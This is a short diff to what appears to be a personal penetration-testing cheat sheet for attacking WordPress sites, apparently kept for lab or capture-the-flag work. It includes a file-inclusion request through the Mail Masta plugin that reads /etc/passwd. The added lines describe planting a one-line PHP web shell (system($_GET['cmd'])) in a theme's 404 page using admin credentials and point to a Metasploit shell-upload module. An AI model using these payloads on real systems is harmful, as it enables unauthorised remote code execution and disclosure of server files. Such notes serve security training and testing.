@@ -108,6 +108,8 @@ Vulnerable Mail Masta Plugin Exploit
     /wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd    
     
 RCE via Theme Editor using Admin Creds    
-Login, select Appearance on the side panel and select Theme Editor to modify the PHP source code. Select an inactive theme to avod breaking the main theme.       
+Login, select Appearance on the side panel and select Theme Editor to modify the PHP source code. Select an inactive theme to avod breaking the main theme.    
+Add to below to theme 404 page then access it (probably) here: http://10.10.10.10/wordpress/wp-content/themes/twentytwenty/404.php     
 
-    exploit/unix/webapp/wp_admin_shell_upload    #metasploit exploit   
+    system($_GET['cmd']);
+    exploit/unix/webapp/wp_admin_shell_upload    #or use this metasploit exploit   
